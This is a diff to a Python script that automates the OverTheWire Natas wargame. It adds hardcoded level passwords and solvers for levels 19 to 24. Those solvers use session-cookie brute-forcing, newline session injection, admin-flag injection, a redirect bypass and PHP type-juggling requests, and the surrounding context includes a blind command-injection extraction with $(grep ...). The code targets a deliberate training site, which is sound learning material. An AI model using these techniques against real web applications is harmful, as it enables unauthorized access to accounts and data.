@@ -16,6 +16,16 @@ cred_dict = {
   "natas0":("natas0", "natas0")
 }
 
+# Pre-loaded creds:
+cred_dict["natas18"] = ("natas18","fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")
+cred_dict["natas20"] = ("natas20","slOKYGsjlJhaqKliGvrgWAzln0JyrWao")
+cred_dict["natas21"] = ("natas21","7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU")
+cred_dict["natas22"] = ("natas22","964laB0r7TuDqJj5b3HFtwsQoc0GhjBF")
+cred_dict["natas23"] = ("natas23","CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5")
+cred_dict["natas24"] = ("natas24","shlL4BvOtawNCd81dwdKRHFzmTEjYYQX")
+cred_dict["natas25"] = ("natas25","UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo")
+
+'''
 # Level 0
 try:
   response = requests.get(url_dict["natas0"], auth=cred_dict["natas0"], timeout=10)
@@ -289,14 +299,14 @@ try:
   response = session.post(url_dict["natas13"]+"/index.php", auth=cred_dict["natas13"],data=data,files=files)
   response.raise_for_status()
   print("\nLevel 13")
-  print("Sending File Upload Request:") 
+  print("Sending File Upload Request:")
   match = re.search(r'upload/[a-zA-Z0-9]+\.php', response.text)
 
   if not match:
     print("[-] Error: Failed to locate the uploaded file path in the response HTML.")
     # Print a small snippet of the response text to debug if necessary
     print(response.text[:500])
-    exit()    
+    exit()
   uploaded_file_path = match.group(0)
   print(uploaded_file_path)
   # Access the uploaded script
@@ -373,7 +383,7 @@ try:
         input_text = f'^{prefix}$(grep ^{password}{char} {passfile17})'
         if is_hit(input_text):
           password += char
-          print(password) 
+          print(password)
           break
     return password
 
@@ -384,7 +394,6 @@ try:
       'needle':data
     }
     resp = s.get(url,params=params,auth=cred_dict["natas16"])
-    resp.raise_for_status()
     return resp and prefix not in resp.text
 
   print("\nLevel 16")
@@ -396,6 +405,7 @@ try:
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
+
 # Level 17
 try:
   chars = string.ascii_letters + string.digits
@@ -430,7 +440,7 @@ except requests.exceptions.RequestException as e:
 
 # Level 18
 
-try:  
+try:
   print("\nLevel 18")
   print("Starting Admin-session Cookie Brute-Force...")
   for session_id in range(1, 641):
@@ -445,10 +455,111 @@ try:
       print(text_only)
       cred_dict["natas19"] = ("natas19",text_only.split()[-3])
       break
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 19
+try:
+  print("\nLevel 19")
+  print("Starting Admin-session Cookie Brute-Force again...")
+  for session_id in range(1, 641):
+    formatted_session_id = str(session_id) + '-admin'
+    encoded_session_id = formatted_session_id.encode('utf-8').hex() 
+    print(f"Current cookie: {encoded_session_id}")
+    cookies = {"PHPSESSID": str(encoded_session_id)}
+    response = requests.get(url_dict["natas19"]+"/index.php", auth=cred_dict["natas19"], cookies=cookies)
+
+    if "You are an admin" in response.text:
+      print(f"Admin session found! PHPSESSID={session_id}")
+      # Parse the response
+      soup = BeautifulSoup(response.text, "html.parser")
+      text_only = soup.get_text(separator=" ", strip=True)
+      print(text_only)
+      cred_dict["natas20"] = ("natas20",text_only.split()[-1])
+      break
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 20
+try:
+  print("\nLevel 20")
+  print("Performing session injection via GET request")
+  data = {"name":"admin=1\nadmin 1","debug":""}
+  response = requests.get(url_dict["natas20"], auth=cred_dict["natas20"],params=data)
+  phpsessid = response.cookies["PHPSESSID"]
+  cookies = {"PHPSESSID": phpsessid}
+  response = requests.get(url_dict["natas20"], auth=cred_dict["natas20"], cookies={"PHPSESSID": phpsessid}, params={"debug": ""})
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  cred_dict["natas21"] = ("natas21",text_only.split(':')[8].split()[0])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 21
+try:
+  print("\nLevel 21")
+  print("Performing session injection via POST request")
+  data = {"align":"center","fontsize":"100%","bgcolor":"yellow","admin":1,"submit":"Update"}
+  params = {"debug":1}
+  session = requests.Session()
+  response = session.post("http://natas21-experimenter.natas.labs.overthewire.org", auth=cred_dict["natas21"],params=params,data=data)
+  phpsessid = response.cookies["PHPSESSID"]
+  cookies = {"PHPSESSID": phpsessid}
+  response = requests.get(url_dict["natas21"], auth=cred_dict["natas21"],cookies=cookies)
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  cred_dict["natas22"] = ("natas22",text_only.split()[-3])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 22
+try:
+  print("\nLevel 22")
+  print("Performing session injection via GET request")
+  response = requests.get(url_dict["natas22"]+"/?revelio",auth=cred_dict["natas22"],allow_redirects=False)
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  print(text_only)
+  cred_dict["natas23"] = ("natas23",text_only.split()[-3])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 23
+try:
+  print("\nLevel 23")
+  print("Performing first PHP Type Juggling Attack...")
+  params = {"passwd":"11iloveyou"}
+  response = requests.get(url_dict["natas23"],auth=cred_dict["natas23"],params=params)
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  print(text_only)
+  cred_dict["natas24"] = ("natas24",text_only.split()[-3])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+'''
+# Level 23
+try:
+  print("\nLevel 24")
+  print("Performing second PHP Type Juggling Attack...")
+  params = {"passwd[]":"test"}
+  response = requests.get(url_dict["natas24"],auth=cred_dict["natas24"],params=params)
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  print(text_only)
+  cred_dict["natas25"] = ("natas25",text_only.split()[-3])
 
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
 
 
-print(cred_dict)
 
+print(cred_dict)
